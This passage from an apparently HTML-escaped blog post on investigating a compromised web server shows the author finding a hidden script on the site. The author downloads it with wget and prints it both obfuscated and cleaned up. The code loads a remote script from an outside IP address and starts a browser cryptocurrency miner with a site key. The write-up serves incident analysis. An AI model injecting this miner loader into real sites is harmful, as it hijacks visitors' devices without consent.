class="o">&amp;lt;&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">&amp;gt;&amp;lt;&lt;/span>&lt;span class="n">span&lt;/span> &lt;span class="n">style&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;color: #333333;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">font&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">family&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">arial&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sans&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">serif&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">font&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">11&lt;/span>&lt;span class="n">px&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">font&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">style&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">normal&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">font&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">weight&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">400&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">letter&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">spacing&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">normal&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">orphans&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">indent&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="n">px&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">transform&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">none&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">white&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">space&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">normal&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">widows&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">word&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">spacing&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="n">px&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">background&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="c1">#ffffff; text-decoration-color: initial; display: inline !important; float: none;&amp;#34;&amp;gt;Copyright &amp;amp;copy; 2003-2018 LogMeIn,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Inc&lt;/span>&lt;span class="o">.&amp;lt;/&lt;/span>&lt;span class="n">span&lt;/span>&lt;span class="o">&amp;gt;&amp;lt;&lt;/span>&lt;span class="n">a&lt;/span> &lt;span class="n">rel&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;nofollow noopener&amp;#34;&lt;/span> &lt;span class="n">target&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;_blank&amp;#34;&lt;/span> &lt;span class="n">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;https://secure.logmein.com/policies/trademark.aspx&amp;#34;&lt;/span> &lt;span class="n">style&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;margin: 0px; padding: 0px; border: 0px; font-style: normal;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">font&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">weight&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">400&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">font&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">stretch&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">inherit&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">font&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">11&lt;/span>&lt;span class="n">px&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">line&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">height&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">inherit&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">font&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">family&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">arial&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sans&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">serif&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">vertical&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">baseline&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">outline&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="n">px&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="c1">#0088ce;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">text&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">decoration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">none&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">cursor&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">pointer&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">letter&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">spacing&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">normal&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">orphans&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">indent&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="n">px&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">transform&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">none&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">white&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">space&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">normal&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">widows&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">word&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">spacing&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="n">px&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">background&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="c1">#ffffff;&amp;#34;&amp;gt;All rights reserved.&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt; , , ,&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This looked more like phishing activity and I thought there could be more dark things lurking in this machine. This explained why removing the scripts did not close the connections.&lt;/p>
+&lt;h2 id="phishing-attack">Phishing Attack
+&lt;/h2>&lt;p>I realized there were potentially 2 (common) ways to attacking this server: either through the &lt;strong>ssh&lt;/strong> open port &lt;strong>22&lt;/strong> or through the web application (hosted on port &lt;strong>80&lt;/strong>). Since there were a lot of activity with the web-server, I visited the domain of the website and checked for suspicious elements on the background.&lt;/p>
+&lt;p>Upon visiting the site’s main page &lt;a class="link" href="https://subdomain.website.ca" target="_blank" rel="noopener"
+>https://subdomain.website.ca&lt;/a> and when inspecting the elements on the HTML page of the site, I found a hidden javascript tag code:&lt;/p>
+&lt;p>&lt;img src="https://rajsimmanravi.github.io/post/cryptojacking-phishing-savi/suspicious_script.png"
+loading="lazy"
+alt="Suspicious Script"
+>&lt;/p>
+&lt;p>Just like any (in)sane person would do, I downloaded the file and took a look:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-console" data-lang="console">&lt;span class="line">&lt;span class="cl">&lt;span class="go">user@host:$ wget http://wt-23...full-http-control
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">user@host:$ cat full-http-control
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">var _0x17e1=[&amp;#34;script&amp;#34;,&amp;#34;createElement&amp;#34;,&amp;#34;type&amp;#34;,&amp;#34;text/javascript&amp;#34;,&amp;#34;readyState&amp;#34;,&amp;#34;onreadystatechange&amp;#34;,&amp;#34;loaded&amp;#34;,&amp;#34;complete&amp;#34;,&amp;#34;onload&amp;#34;,&amp;#34;src&amp;#34;,&amp;#34;appendChild&amp;#34;,&amp;#34;head&amp;#34;,
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">&amp;#34;getElementsByTagName&amp;#34;,&amp;#34;http://146.185.234.xx/hhY6.js&amp;#34;,&amp;#34;undefined&amp;#34;,&amp;#34;stop&amp;#34;,&amp;#34;_client&amp;#34;,&amp;#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&amp;#34;,&amp;#34;start&amp;#34;];
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">function loadScript(_0x17a8x2,_0x17a8x3){var _0x17a8x4=document[_0x17e1[1]](_0x17e1[0]);_0x17a8x4[_0x17e1[2]]= _0x17e1[3];if(_0x17a8x4[_0x17e1[4]])
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">{_0x17a8x4[_0x17e1[5]]= function(){if(_0x17a8x4[_0x17e1[4]]== _0x17e1[6]|| _0x17a8x4[_0x17e1[4]]== _0x17e1[7]){_0x17a8x4[_0x17e1[5]]= null;_0x17a8x3()}}}
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">else {_0x17a8x4[_0x17e1[8]]= function(){_0x17a8x3()}};_0x17a8x4[_0x17e1[9]]= _0x17a8x2;document[_0x17e1[12]](_0x17e1[11])[0][_0x17e1[10]](_0x17a8x4)}
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">loadScript(_0x17e1[13],function(){setTimeout(function(){if( typeof (miner)!= _0x17e1[14]){try{miner[_0x17e1[15]]()}catch(e){}};if( typeof (_client)!=
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">_0x17e1[14]){try{_client[_0x17e1[15]]()}catch(e){}};document[_0x17e1[16]]= new
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">Client.Anonymous(_0x17e1[17],{throttle:0.3});document[_0x17e1[16]][_0x17e1[18]](Client.FORCE_MULTI_TAB)},1000)})
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>A cleaner version would be:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="k">var&lt;/span> &lt;span class="n">_0x17e1&lt;/span>&lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;script&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;createElement&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;Type&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;text/javascript&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;readyState&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;Onreadystatechange&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;Loaded&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;Complete&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;Onload&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;Src&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;appendChild&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;Head&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;getElementsByTagName&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;http://146.185.234.xx/hhY6.js&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;Undefined&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;Stop&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;_client&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;Start&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">function&lt;/span> &lt;span class="n">loadScript&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_0x17a8x2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">_0x17a8x3&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">var&lt;/span> &lt;span class="n">_0x17a8x4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">document&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]](&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]]){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">function&lt;/span>&lt;span class="p">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">]){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">null&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">_0x17a8x3&lt;/span>&lt;span class="p">()}}}&lt;/span>&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]]&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">function&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="n">_0x17a8x3&lt;/span>&lt;span class="p">()}};&lt;/span>&lt;span class="n">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="p">]]&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_0x17a8x2&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">document&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">]](&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">])[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">]](&lt;/span>&lt;span class="n">_0x17a8x4&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="n">loadScript&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="n">setTimeout&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nb">typeof&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">miner&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">!=&lt;/span> &lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">]){&lt;/span>&lt;span class="n">try&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">miner&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">]]()}&lt;/span>&lt;span class="n">catch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">){}};&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nb">typeof&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">_client&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">!=&lt;/span> &lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">]){&lt;/span>&lt;span class="n">try&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">_client&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">]]()}&lt;/span>&lt;span class="n">catch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">){}};&lt;/span>&lt;span class="n">document&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">]]&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">new&lt;/span> &lt;span class="n">Client&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Anonymous&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">17&lt;/span>&lt;span class="p">],{&lt;/span>&lt;span class="n">throttle&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mf">0.3&lt;/span>&lt;span class="p">});&lt;/span>&lt;span class="n">document&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">]][&lt;/span>&lt;span class="n">_0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">]](&lt;/span>&lt;span class="n">Client&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">FORCE_MULTI_TAB&lt;/span>&lt;span class="p">)},&lt;/span>&lt;span class="mi">1000&lt;/span>&lt;span class="p">)})&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So, this link fetched some malicious script to load hhY6.js. I tried to unravel the loadScript functions for better verbosity:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
